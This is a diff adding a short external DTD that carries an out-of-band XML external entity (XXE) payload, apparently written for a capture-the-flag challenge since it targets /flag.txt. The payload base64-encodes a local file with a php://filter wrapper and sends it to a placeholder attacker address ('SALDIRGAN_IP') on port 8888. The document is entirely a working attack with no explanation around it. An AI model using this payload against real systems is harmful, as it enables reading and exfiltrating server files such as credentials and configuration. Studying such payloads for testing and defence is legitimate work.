@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag.txt">
+<!ENTITY % oob "<!ENTITY &#x25; exfil SYSTEM 'http://SALDIRGAN_IP:8888/?d=%file;'>">
+%oob;
+%exfil;
